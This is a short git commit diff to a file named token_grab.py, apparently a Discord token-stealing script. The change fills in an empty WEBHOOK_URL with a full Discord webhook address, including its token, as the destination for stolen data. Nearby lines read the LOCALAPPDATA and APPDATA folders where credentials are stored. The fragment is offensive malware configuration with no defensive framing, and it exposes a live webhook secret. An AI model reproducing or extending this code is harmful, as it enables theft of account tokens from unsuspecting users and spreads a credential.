ef37f55b899cb362dd2d8ea40b8274296802c9c7
yassinvvs <89495748+yassinvvs@users.noreply.github.com>
2025-03-14 07:33:48 +0100

    token_grab.py

--- token_grab.py
+++ token_grab.py
@@ -11,7 +11,7 @@ from threading import Thread
 from time import sleep
 from sys import argv
 
-WEBHOOK_URL = "" # WebHook ICI
+WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1343076052666159135/gsWiZ6_nDXqnfMtXWBcyzV2cGsjOMJF_-ZHGbuF0kr4WYyWDI6xKE2741Nw8JVL0tF1I" # WebHook ICI
 
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
